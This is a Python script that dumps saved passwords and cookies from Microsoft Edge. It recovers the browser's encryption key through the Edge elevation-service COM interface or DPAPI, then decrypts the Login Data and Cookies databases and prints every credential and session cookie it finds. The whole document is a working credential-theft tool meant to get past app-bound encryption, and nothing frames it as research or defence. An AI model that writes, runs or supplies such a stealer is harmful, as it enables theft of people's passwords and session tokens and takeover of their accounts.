#!/usr/bin/env python3
"""Edge v20 ABE password extractor via comtypes IElevator COM call.
Uses the correct IID discovered by COMrade ABE analyzer."""
import json, base64, os, sqlite3, shutil, tempfile, struct
from Crypto.Cipher import AES
import ctypes
from ctypes import wintypes, c_uint32, c_void_p, POINTER, byref

# ── COM setup via comtypes ──
import comtypes
import comtypes.client
from comtypes import GUID, IUnknown, COMMETHOD, HRESULT

# CLSID for Edge elevation service
CLSID_Elevator = GUID("{1FCBE96C-1697-43AF-9140-2897C7C69767}")

# Try IElevatorEdge first (this is the Edge-specific one)
IID_IElevatorEdge = GUID("{C9C2B807-7731-4F34-81B7-44FF7779522B}")
# Fallback: IElevator2
IID_IElevator2 = GUID("{8F7B6792-784D-4047-845D-1782EFBEF205}")

# Define the COM interface using comtypes
class IUnknownCOM(IUnknown):
    _iid_ = GUID("{00000000-0000-0000-C000-000000000046}")

class IElevatorCOM(IUnknownCOM):
    _iid_ = IID_IElevatorEdge
    _methods_ = [
        COMMETHOD([], HRESULT, 'RunRecoveryCRXElevated'),
        COMMETHOD([], HRESULT, 'EncryptData'),
        COMMETHOD([], HRESULT, 'DecryptData'),
    ]

class BLOB(ctypes.Structure):
    _fields_ = [("cbData", c_uint32), ("pbData", c_void_p)]

def dpapi_unprotect(data):
    """CryptUnprotectData in current user context."""
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", c_uint32), ("pbData", ctypes.c_char_p)]
    
    crypt32 = ctypes.windll.crypt32
    in_blob = DATA_BLOB()
    in_blob.cbData = len(data)
    in_blob.pbData = ctypes.create_string_buffer(data)
    
    out_blob = DATA_BLOB()
    ret = crypt32.CryptUnprotectData(byref(in_blob), None, None, None, None, 0, byref(out_blob))
    if not ret:
        raise OSError(f"CryptUnprotectData failed: {ctypes.GetLastError()}")
    result = ctypes.string_at(out_blob.pbData, out_blob.cbData)
    ctypes.windll.kernel32.LocalFree(out_blob.pbData)
    return result

def elevator_decrypt_com(encrypted_data):
    """Decrypt via IElevator COM using comtypes (proper marshalling)."""
    comtypes.CoInitialize()
    
    # Create COM object
    ptr = comtypes.client.CreateObject(CLSID_Elevator, interface=IElevatorCOM)
    
    # Prepare input blob
    input_buf = ctypes.create_string_buffer(encrypted_data)
    in_blob = BLOB()
    in_blob.cbData = len(encrypted_data)
    in_blob.pbData = ctypes.cast(input_buf, c_void_p)
    
    # Output blob
    out_blob = BLOB()
    out_blob.cbData = 0
    out_blob.pbData = None
    
    # Call DecryptData - comtypes handles vtable dispatch automatically
    # based on the _methods_ definition
    hr = ptr.DecryptData(byref(in_blob), byref(out_blob), None)
    
    if hr != 0:
        raise OSError(f"DecryptData HRESULT: 0x{hr & 0xFFFFFFFF:08X}")
    
    if out_blob.cbData == 0:
        raise ValueError("empty output")
    
    return ctypes.string_at(out_blob.pbData, out_blob.cbData)

def decrypt_pw(blob, key):
    """Decrypt v10/v20 password blob."""
    if not blob or len(blob) < 3:
        return None
    ver = blob[:3]
    if ver in (b'v10', b'v11'):
        nonce, ct = blob[3:15], blob[15:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ct[:-16], ct[-16:]).decode('utf-8', errors='replace')
    elif ver == b'v20':
        payload = blob[3:]
        nonce, ct = payload[:12], payload[12:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ct[:-16], ct[-16:]).decode('utf-8', errors='replace')
    return None

def main():
    profile = os.environ.get('USERPROFILE', 'C:\\Users\\admin')
    edge = os.path.join(profile, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')
    ls_path = os.path.join(edge, 'Local State')
    
    # 1. Read Local State
    with open(ls_path, 'r', encoding='utf-8') as f:
        ls = json.load(f)
    osc = ls.get('os_crypt', {})
    
    aes_key = None
    key_source = "none"
    
    # 2. Try v20 via IElevator COM
    ab_key = osc.get('app_bound_encrypted_key', '')
    if ab_key:
        print(f"[*] app_bound key: {len(ab_key)} chars")
        ab_bytes = base64.b64decode(ab_key)
        blob = ab_bytes[4:]  # strip APPB
        
        # Try IElevatorEdge first
        for iid_name, iid in [("IElevatorEdge", IID_IElevatorEdge), ("IElevator2", IID_IElevator2)]:
            try:
                print(f"[*] trying {iid_name}...")
                # Update the interface IID
                IElevatorCOM._iid_ = iid
                aes_key = elevator_decrypt_com(blob)
                key_source = f"IElevator ({iid_name})"
                print(f"[+] AES key via {iid_name}: {aes_key.hex()}")
                break
            except Exception as e:
                print(f"[-] {iid_name}: {e}")
        
        # Fallback: user DPAPI on the blob
        if not aes_key:
            try:
                print("[*] trying direct user DPAPI...")
                aes_key = dpapi_unprotect(blob)
                key_source = "user DPAPI (layer 1)"
                print(f"[+] Layer 1 key: {aes_key.hex()}")
                # Try to decrypt layer 2 with user DPAPI too
                try:
                    aes_key = dpapi_unprotect(aes_key)
                    key_source = "user DPAPI (layer 2)"
                    print(f"[+] Layer 2 key: {aes_key.hex()}")
                except:
                    pass
            except Exception as e:
                print(f"[-] user DPAPI: {e}")
    
    # 3. Try v10 key
    if not aes_key:
        enc_key = osc.get('encrypted_key', '')
        if enc_key:
            enc_bytes = base64.b64decode(enc_key)
            aes_key = dpapi_unprotect(enc_bytes[5:])
            key_source = "v10 encrypted_key DPAPI"
            print(f"[+] v10 key: {aes_key.hex()}")
    
    if not aes_key:
        print("[-] no key recovered")
        return
    
    # 4. Dump passwords
    login_db = os.path.join(edge, 'Default', 'Login Data')
    tmp = os.path.join(tempfile.gettempdir(), f"ld_{os.getpid()}")
    shutil.copy2(login_db, tmp)
    
    conn = sqlite3.connect(tmp)
    c = conn.cursor()
    c.execute("SELECT origin_url, username_value, password_value FROM logins ORDER BY date_created DESC")
    
    print(f"\n{'='*80}")
    print(f"PASSWORDS (key source: {key_source})")
    print(f"{'='*80}")
    
    for url, user, pw_blob in c.fetchall():
        if pw_blob:
            try:
                pw = decrypt_pw(pw_blob, aes_key)
            except Exception as e:
                pw = f"<err: {e}>"
        else:
            pw = None
        print(f"{(url or '?'):<50} {(user or '?'):<30} {pw}")
    
    # 5. Dump cookies
    cookie_db = os.path.join(edge, 'Default', 'Network', 'Cookies')
    if os.path.exists(cookie_db):
        shutil.copy2(cookie_db, tmp)
        conn2 = sqlite3.connect(tmp)
        c2 = conn2.cursor()
        c2.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE encrypted_value IS NOT NULL AND length(encrypted_value) > 3")
        print(f"\n{'='*80}")
        print("COOKIES")
        for host, name, enc in c2.fetchall():
            try:
                val = decrypt_pw(enc, aes_key)
                if val:
                    print(f"  {host:40s} {name:30s} = {val[:60]}")
            except:
                pass
        conn2.close()
        os.remove(tmp)
    
    conn.close()
    os.remove(tmp)
    print("\n[+] done")

if __name__ == '__main__':
    main()